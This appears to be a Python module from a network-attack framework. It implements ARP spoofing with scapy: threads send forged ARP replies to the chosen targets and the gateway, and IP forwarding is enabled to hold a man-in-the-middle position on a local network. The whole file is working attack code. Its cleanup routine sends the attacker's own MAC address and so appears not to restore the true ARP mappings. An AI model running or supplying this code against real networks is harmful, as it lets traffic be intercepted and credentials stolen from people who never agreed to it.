from threading import Thread, Lock, Condition
from scapy.all import ARP, send, conf
from scapy.layers.l2 import getmacbyip
from typing import List
from core.host.service import HostService
from core.event.model import Event, EventType
from modules.arp_spoof.ip_forward import IPForward
import socket
import time

class ArpSpoof:
    def __init__(self, host_service: HostService):
        self.host_service: HostService = host_service
        self.spoofing_threads: List[Thread] = []
        self.lock = Lock()
        self.stop_event = Condition(self.lock)
        self.is_running = False
        self.target_ips: List[str] = []
        self.host_ip: str = socket.gethostbyname(socket.getfqdn())
        self.host_mac: str = getmacbyip(self.host_ip)
        self.gateway_ip: str = conf.route.route("0.0.0.0")[2]
        self.gateway_mac: str = getmacbyip(self.gateway_ip)
        self.THROTTLE: int = 8
        self.ip_forward = IPForward()

    async def start(self, target_ips: List[str]) -> None:
        with self.lock:
            try:
                self.is_running = True
                self.target_ips = target_ips
                self.ip_forward.enable()

                self.hosts = self.host_service.get_hosts_from_ips(target_ips)
                event = Event(type=EventType.ARP_SPOOF_STARTED,
                              data=self.hosts)
                await self.host_service.event_handler.dispatch(event)

                for target_ip in target_ips:
                    self.dispatch_thread(target_ip, self.gateway_ip)
                    self.dispatch_thread(self.gateway_ip, target_ip)
            except Exception:
                self.is_running = False
                raise

    def dispatch_thread(self, target_ip: str, spoof_ip: str) -> None:
        thread = Thread(target=self.arp_spoof, args=(target_ip, spoof_ip))
        thread.start()
        self.spoofing_threads.append(thread)

    def arp_spoof(self, target_ip: str, spoof_ip: str) -> None:
        while True:
            with self.stop_event:
                if not self.is_running:
                    break
                send(ARP(op = 2, pdst = target_ip,
                        hwdst = self.host_mac, psrc = spoof_ip))
                send(ARP(op = 2, pdst = target_ip,
                        hwdst = getmacbyip(target_ip), psrc = spoof_ip))

                self.stop_event.wait_for(lambda: self.is_running)
            time.sleep(self.THROTTLE)

    async def stop(self) -> None:
        with self.stop_event:
            self.is_running = False
            self.stop_event.notify_all()

        for thread in self.spoofing_threads:
            thread.join()

        self.spoofing_threads = []

        for target_ip in self.target_ips:
            target_mac = getmacbyip(target_ip)
            send(ARP(op = 2, pdst = target_ip, hwdst = target_mac,
                     psrc = self.gateway_ip, hwsrc = self.host_mac))
            send(ARP(op = 2, pdst = self.gateway_ip, hwdst = self.gateway_mac,
                     psrc = target_ip, hwsrc = target_mac))

        self.ip_forward.disable()

        self.hosts = self.host_service.get_hosts_from_ips(self.target_ips)
        event = Event(type=EventType.ARP_SPOOF_STOPPED, data=self.hosts)
        await self.host_service.event_handler.dispatch(event)

        self.target_ips = []